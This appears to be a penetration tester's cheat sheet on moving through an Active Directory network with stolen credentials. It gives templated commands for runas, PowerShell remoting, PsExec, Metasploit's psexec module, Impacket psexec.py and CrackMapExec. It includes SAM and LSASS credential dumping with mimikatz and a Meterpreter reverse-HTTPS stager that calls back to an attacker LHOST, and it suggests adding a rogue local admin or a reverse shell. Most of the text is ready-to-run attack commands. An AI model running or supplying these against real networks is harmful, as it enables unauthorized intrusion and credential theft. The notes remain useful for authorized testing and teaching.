# Active Directory - Credentials Theft Shuffle

### User hunting

###### Session hunting with BloodHound

BloodHound uses graph theory to reveal the hidden and often unintended
relationships within an Active Directory environment. Attackers can use
BloodHound to easily identify highly complex attack paths that would otherwise
be impossible to quickly identify.

### Identify local admin access for obtained credentials

### Credentials reuse

The credentials used for authentication and command execution through SMB must
have elevated privileges on the targeted client machine.

To quickly identity which servers or computers in the domain expose a SMB
service (usually all Windows hosts), AD queries and nmap can be used in
combination (refer to the Methodology - Domain Recon note).

###### Locally use credentials

Set the main DNS server on the attacking computer to the Domain Controller IP
address:

```
Control Panel -> Network and Internet -> Network and Sharing Center -> Change adapter setting -> right click on the adapter being used -> Properties -> Internet Protocol Version 4 (TCP/IPv4) -> Properties -> Set the Preferred DNS server field  
```

To authenticate locally as another user (with plaintext credentials) and
execute Powershell commands the following commands can be used.

```
# runas
# Use /NetOnly on off-domain machines
runas /NetOnly /user:<DOMAIN>\<USERNAME> powershell.exe

# For the commands supporting PSCredential
$secpasswd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $secpasswd)
```

The `NetOnly` option will make `runas` execute on your local computer as the
currently logged on user, but any connections to other computers on the network
will be made using the user account specified.

The PowerShell remoting tools presented below can be used as well to execute
commands locally under the identity of another user.

###### PowerShell remoting

Multiples cmdlets are incorporated into the PowerShell core to execute commands
remotely. These cmdlets rely on the Windows Remote Management (WinRM) service
which is Microsoft implementation of the web services managements (WS-Man)
protocol.

By default, WS-Man / WinRM and thus remoting through PowerShell use port 5985
and 5986 for connections over HTTP and HTTPS, respectively.

```
$user = '<USERNAME>';
$pass = '<PASSWORD>';
$spass = ConvertTo-SecureString -AsPlainText $pass -Force;
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList $user,$spass;

Invoke-Command -ComputerName <HOSTNAME | IP> -Credential $creds -ScriptBlock {<COMMAND>}";

# Interactive PowerShell session
Enter-PSSession -ComputerName <HOSTNAME | IP> -Credential $creds
```

###### PsExec

The `PsExec` CLI utility, signed by Microsoft and from the `sysinternals` suite,
can be used to execute commands, locally or remotely and under the current
user or the specified user identity.  

While the use of a more complete attack framework is recommended on the
attacking machine (such as `CrackMapExec`), `PsExec` can be upload on a
compromised host to hops on until now unreachable targets.

`PsExec` uses a named pipe with the Server Message Block (SMB) protocol, which
runs on TCP port 445. The `PsExec` tool requires that the executable be present
on the system performing the connection, but no additional software is
necessary on the target. Additionally, the credentials supplied to `PsExec` for
authentication must have elevated privileges on the targeted client machine.

```
# -s   Run the remote process in the System account.
# -i   Run the program so that it interacts with the desktop of the specified session on the remote system
# -d   Don't wait for process to terminate (non-interactive).

psexec [\\computer[,computer2[,...] | @file]] [-u user [-p psswd]] [-n s] [-r servicename] [-h] [-l] [-s|-e] [-x] [-i [session]] [-c [-f|-v]] [-w directory] [-d] [-<priority>][-a n,n,...] cmd [arguments]

# Current user identity
# Use the -s option to run as SYSTEM if needed
psexec.exe -accepteula \\<HOST | IP> -s -i -d cmd.exe
psexec.exe -accepteula \\<HOST | IP> -u <DOMAIN | WORKGROUP>\<USERNAME> -p <PASSWORD> -s -i -d cmd.exe
psexec.exe -accepteula \\<HOST | IP> -s -i -d cmd.exe /c <COMMAND> <COMMAND_ARGS>
```

###### Metasploit PsExec

The `Metasploit` module *exploit/windows/smb/psexec* can be used to execute a
metasploit payload on a target.

This module uses a valid administrator username and password or password hash to
execute an arbitrary payload, similarly to the `PsExec` utility provided by
`SysInternals`.

```
# If using a password hash, set SMBPass to <LM_HASH:NT_HASH>
msf> use exploit/windows/smb/psexec
```

###### Impacket psexec.py

The python script `psexec.py` from the scripts collection `Impacket` can be used
as a substitute to the SysInternals or Metasploit psexec tools.

Usage:

```
# The --target-ip specify the IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is an unresolvable NetBIOS name.
# The command default to
psexec.py [-hashes <LM_HASH:NT_HASH>] [-dc-ip <DC_IP>] [-target-ip <TARGET_IP>] [-port [<PORT>]] [[<DOMAIN>/]<USERNAME>[:<PASSWORD>]@]<HOSTNAME | IP> [<COMMAND> [<COMMAND> ...]]
```

Contrary to the two previous tools, the python Impacket `psexec.py` can be
easily incorporated in scripts:

```
import psexec

psobject = psexec.PSEXEC("cmd.exe", "c:\\windows\\system32\\", None, "445/SMB", username = '<USERNAME>', password = '<PASSWORD>')
raw_result = psobject.run("<HOSTNAME | IP>")
print raw_result
psobject.kill();
```

###### CrackMapExec

`CrackMapExec` is a "Swiss army knife for pentesting Windows/Active Directory
environments".  

`CrackMapExec` can notably be used to test credentials (password or hashes)
through SMB or MSSQL for local administrator access on a large range of targets.

CME has three different command execution methods and, by default will fail over
to a different execution method if one fails. It attempts to execute commands
in the following order:
  1. `wmiexec` executes commands via WMI
  2. `atexec` executes commands by scheduling a task with windows task scheduler
  3. `smbexec` executes commands by creating and running a service

As with `PsExec`, the credentials supplied for authentication must have elevated
privileges on the targeted system.

`CrackMapExec` include multiples modules:

```
crackmapexec --list-modules

[*] empire_exec          Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] mimikittenz          Executes Mimikittenz
[*] rundll32_exec        Executes a command using rundll32 and Windows's native javascript interpreter
[*] com_exec             Executes a command using a COM scriptlet to bypass whitelisting
[*] tokenrider           Allows for automatic token enumeration, impersonation and mass lateral spread using privileges instead of dumped credentials
[*] tokens               Enumerates available tokens using Powersploit's Invoke-TokenManipulation
[*] mimikatz             Executes PowerSploit's Invoke-Mimikatz.ps1 script
[*] powerview            Wrapper for PowerView's functions
[*] shellinject          Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
[*] enum_chrome          Uses Powersploit's Invoke-Mimikatz.ps1 script to decrypt saved Chrome passwords
[*] metinject            Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
[*] peinject             Downloads the specified DLL/EXE and injects it into memory using PowerSploit's Invoke-ReflectivePEInjection.ps1 script
[*] eventvwr_bypass      Executes a command using the eventvwr.exe fileless UAC bypass
```

CME cheat sheet:

```
# As of December 2018, no output to file file.
# Use | tee <OUTPUT_FILE> to display standard output and stored result to a file

# TARGETS can be IP(s), range(s), CIDR(s), hostname(s), FQDN(s) or file(s) containg a list of targets

crackmapexec <TARGETS> [-M <MODULE> [-o <MODULE_OPTION>]] (-d <DOMAIN> | --local-auth) -u <USERNAME | USERNAMES_FILE> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>) [--sam] [-x <COMMAND> | -X <PS_COMMAND>]

# SAM
crackmapexec <TARGETS> --sam (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)

# LSASS dump
crackmapexec <TARGETS> -M mimikatz (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)

# Meterpreter
# msf > use multi/handler
# msf exploit(handler) > set payload windows/meterpreter/reverse_https
crackmapexec <TARGETS> -M metinject -o LHOST=<HOST> LPORT=<PORT> -d <DOMAIN> -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
```

Note that:

  - the *--lsa* option dumps LSA secrets which can't be used in PtH attack and
    are harder to crack
  - The <TARGETS\> and <MODULE\> should be specified before the credentials as
    a CME bug could skip the targets / module otherwise
  - If the targeted host is unreachable, CME will exit with out returning any
    error message
  - In case the metinject fails, a local administrator can be added for RDP
    access or a powershell reverse shell injected in memory (Refer to the `[General] Shells - PowerShell` note)   

### Credentials dumping

Credential dumping is the process of obtaining account login and password
information, normally in the form of a hash or a clear text password, from
the operating system.

To dump credentials on a Windows host, refer to the
`[Windows] Post Exploit` note.
